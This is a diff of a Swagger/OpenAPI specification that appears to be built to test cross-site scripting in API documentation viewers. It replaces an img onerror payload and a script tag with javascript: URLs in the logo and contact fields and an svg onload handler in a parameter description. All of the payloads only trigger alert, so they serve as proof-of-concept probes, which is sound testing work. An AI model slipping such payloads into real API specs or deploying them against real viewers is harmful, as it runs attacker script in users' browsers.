@@ -1,11 +1,17 @@
-openapi: 3.0.0
+swagger: "2.0"
 info:
-  title: "XSS Test <img src=x onerror=alert(document.domain)>"
-  version: "1.0"
+  title: "XSS Test"
+  # Try these alternate payloads:
+  x-logo:
+    url: "javascript:alert(1)"
+  contact:
+    url: "javascript:alert(document.domain)"
 paths:
-  /xss:
+  /test:
     get:
-      summary: "<script>alert('SwaggerXSS')</script>"
-      responses:
-        '200':
-          description: "Successful"
+      summary: "Normal endpoint"
+      parameters:
+        - name: "exploit"
+          in: query
+          description: "<svg/onload=alert(1)>"
+          type: string
